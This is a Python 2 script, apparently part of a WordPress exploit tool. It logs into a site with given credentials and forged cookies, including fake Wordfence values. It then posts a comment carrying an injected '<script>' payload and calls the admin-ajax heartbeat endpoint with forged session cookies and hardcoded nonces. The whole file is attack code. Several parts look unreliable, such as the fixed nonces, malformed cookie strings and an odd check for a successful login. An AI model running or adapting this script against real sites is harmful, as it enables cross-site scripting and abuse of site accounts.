import random
import time
import urllib

import requests

from hashing.cookies import create_random_cookie, random_string


class LoginFailedException(Exception):
    pass


class POSTRequestFailure(Exception):
    pass


def make_request(url, username, password, useragent=None):
    ext = ("/wp-login.php", "/wp-comments-post.php", "/wp-admin/admin-ajax.php")
    headers = {
        "Host": url.split("/")[2],
        "User-Agent": useragent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q = 0.9, * / *;q = 0.8",
        "Referer": "{}/wp-login.php?loggedout=true".format(url),
        "Cookie": "wordpress_test_cookie=WP+Cookie+Check; wf_loginalerted_{} "
                  "comment_author_{}={}; comment_author_email_{}={}".format(
            create_random_cookie(waf=True),
            create_random_cookie(
                author=True), urllib.quote_plus(random_string()),
            create_random_cookie(author=True), urllib.quote_plus(
                random_string(email=True))
        ),
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    login_url = "{}{}".format(url, ext[0])
    login_req_data = "log={}&pwd={}&wp-submit=Log+In&redirect_to={}%2Fwp-admin%2F&testcookie=1".format(
        username, password, urllib.quote_plus(url)
    )
    login_req = requests.post(login_url, headers=headers, data=login_req_data)
    if "ERROR" in login_req.content:
        raise LoginFailedException("login request failed")
    if "<h2>Updates Needed</h2>" in login_req.content:
        print("login successful")
        comment_url = "{}{}".format(url, ext[1])
        comment_request_data = (
            "comment={}&submit=Post+Comment&comment_post_ID={}&comment_parent=0&_wp_unfiltered_html_comment=fbcb5e3e03".format(
                urllib.quote_plus(
                    "<script>alert('request from exploit mod');</script>"),
                str(random.choice(range(1, 5000)))
            )
        )
        headers["Referer"] = "{}{}".format(url, "/checkout/")
        requests.post(comment_url, headers=headers,
                      data=comment_request_data, timeout=2)
        headers["Cookie"] = ""
        headers["Accept"] = "application/json, text/javascript, */*; q=0.01"
        headers["Accept-Language"] = "en-US,en;q=0.5"
        headers["Accept-Encoding"] = "gzip, deflate"
        headers["Referer"] = "{}/wp-admin/edit-comments.php?paged=1&ids=121%2C120".format(
            url)
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"
        headers["Cookie"] = "{}; {}; {}; {}; {}; {}; {}; {}; {}; {}".format(
            "wordpress_{}={}".format(
                create_random_cookie(author=True),
                urllib.quote_plus(create_random_cookie(
                    wp_syntax=True, username=username))
            ),
            "wordpress_test_cookie=WP+Cookie+check",
            "wf_loginalerted_{}".format(create_random_cookie(waf=True)),
            "comment_author_{}={}".format(
                create_random_cookie(author=True), random_string()),
            "comment_author_email_{}={}".format(
                create_random_cookie(author=True), urllib.quote_plus(
                    random_string(email=True))
            ),
            "wf_loginalerted_{}".format(create_random_cookie(waf=True)),
            "wf_loginalerted_{}".format(create_random_cookie(waf=True)),
            "wordpress_logged_in_{}={}".format(
                create_random_cookie(author=True),
                urllib.quote_plus(create_random_cookie(
                    wp_syntax=True, username=username))
            ),
            "wp-settings-1=editor%3Dtinymce",
            "wp-settings-time-1={}".format(str(time.time() - 2).split(".")[0])
        )
        final_url = "{}{}".format(url, ext[2])
        final_post_data = "interval=60&_nonce=9e52ad8911&action=heartbeat&screen_id=edit-comments&has_focus=false"
        final_request = requests.post(
            final_url, headers=headers, data=final_post_data)
        data = final_request.json()
        if not data["wp-auth-check"]:
            raise POSTRequestFailure("POST failed to send")
